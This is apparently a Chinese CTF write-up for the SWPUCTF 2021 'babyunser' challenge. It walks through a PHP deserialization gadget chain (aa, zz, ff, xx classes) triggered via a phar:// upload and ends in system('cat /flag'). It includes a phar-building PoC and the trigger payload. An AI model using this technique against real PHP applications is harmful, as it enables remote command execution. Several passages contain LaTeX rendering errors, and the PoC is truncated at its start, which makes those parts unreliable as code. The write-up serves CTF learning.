---
title: "Web 15 [SWPUCTF 2021 新生赛]babyunser"
published: 2026-02-20
category: CTF
---

![](https://pic.npiter.de/file/1771551871192_20260220094427165.png)

这道题主要是学习师傅的WP，对于反序列化还完全不懂

打开题目
![](https://pic.npiter.de/file/1771551876458_20260220094427166.png)

> [!TIP]
>
>
> 可以上传和查看搜索文件

**核心**：

- 调用的是xx类的__call方法，通过此方法构造恶意函数进而执行我们传入的命令

我也是照着做，毕竟第一次真不会,以下全当学习：:sob:

链子的起点是aa类

```
$a=new aa() #new一个aa类的对象

```

aa类的__ destruct方法中用了strtolower函数且参数是属性name，此函数用于将字符串转换成小写字母形式，因此我们可以将其参数设置成zz类的对象，此时zz类的对象会被当成字符串从而触发zz类的__toString方法

```
$a->name=new zz() #将aa类的对象的name属性赋值为zz类的对象

```

在zz类的__toString方法中

***this->{_POST[‘method’]}($_POST[‘var’]);***

这行代码调用了zz类中的一个函数，但是函数名和参数都需要我们自己POST来传
我们可以让它调用zz类的write函数，将参数设置为content （为什么是content原因往下看）
因此需要post传参 ***method=write&var=content***
此时上面代码就变成了

```
	        $this->write('content')

```

此时就来到zz类的write函数
我们可以很清楚的看到

***lt=this->filename->$var***

当前类的filename的属性赋值给了变量var属性赋值给了变量lt，而这个变量$var就是上面我们传入的参数content
于是,上面的代码就相当于

```
$lt=$this->filename->content

```

因此我们可以将当前类的filename属性赋值为ff类的对象，这样就相当于将ff类中的content属性赋值给变量$lt，但是在ff类中，content是私有属性，是不可通过外部访问的。这样，因为我们在外部访问了ff类中不可访问的私有属性content从而触发了ff类中的__get方法。

```
$a->name->filename=new ff(); #将filename属性赋值为ff类的对象

```

而此时的变量Missing open brace for subscriptvar，也就是content,将作为__get方法的参数传入进去，也就是变量var，也就是content,将作为__get方法的参数传入进去，也就是变量key
所以最终触发的是

```
__get('content')

```

而在__get函数内部又有这么一行代码

***this−>key->{Extra close brace or missing open bracethis->func}(this->func}(_POST[‘cmd’]);***

我们知道此时的变量$key是触发__get方法时传入的content
所以上面的代码就相当于

```
$this->content->{$this->func}($_POST['cmd']);

```

可以看到我们调用了一个函数，这个函数是当前类的属性content中的函数，函数名为当前类的func属性的值（即），函数变量为传入的参数的值即this−>func），函数变量为POST传入的参数cmd的值(即_POST[‘cmd’])

如果此时直接将func赋值为system，cmd赋值为cat /flag
最终得到的是

```
$this->content->system('cat /flag');

```

很显然这样的代码并不能执行，因为当前类的content还没有赋值，并且也content中也没有system方法，而且它和 system(‘cat /flag’) 也不一样**所以ff类的__get方法并不是链子的终点**

我们需要将ff类的content属性赋值为xx类的对象，此时就相当于调用了xx类中的system方法

xx类中有system方法吗？很显然没有！

但是，由于我们调用了xx类中不存在的方法，因此触发了xx类中的__call方法
__call方法接收两个参数，一个是一个是name,一个是arg
这两个参数分别对应我们调用的不存在的方法的方法名和参数
也就是我们最终触发的是

```
__call('system','cat /flag')

```

而在__call函数中对此函数又进行了构造，也就是这行代码

***name(arg[0]);***

变量是，name是system，arg[0]是我们传入的第一个参数’cat /flag’
因此构造成了函数

```
system('cat /flag')

```

至此，链子结束！

最终poc

```
content=new xx();
    }
}
class zz{
    public $filename;
    public $content;
}
class xx{
    public $name;
    public $arg;
}
$a=new aa();
$a->name=new zz();
$a->name->filename=new ff();

$phar = new phar('exp.phar');
$phar -> startBuffering();
$phar -> setStub("");
$phar -> setMetadata($a);
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
?>

```

```
file=phar://upload/你的文件.txt&method=write&var=content&cmd=cat /flag

```

![](https://pic.npiter.de/file/1771551884066_20260220094427167.png)
